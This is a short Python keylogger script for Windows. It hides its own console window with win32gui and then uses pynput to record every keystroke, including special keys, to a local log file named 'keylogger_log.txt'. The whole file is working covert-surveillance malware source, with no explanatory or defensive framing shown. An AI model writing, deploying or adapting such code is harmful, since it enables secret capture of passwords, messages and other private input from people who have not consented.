from pynput import keyboard
import os
import win32console
import win32gui
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(script_dir, 'keylogger_log.txt')
os.makedirs(os.path.dirname(log_file), exist_ok=True)

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f' [{key}] ')
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
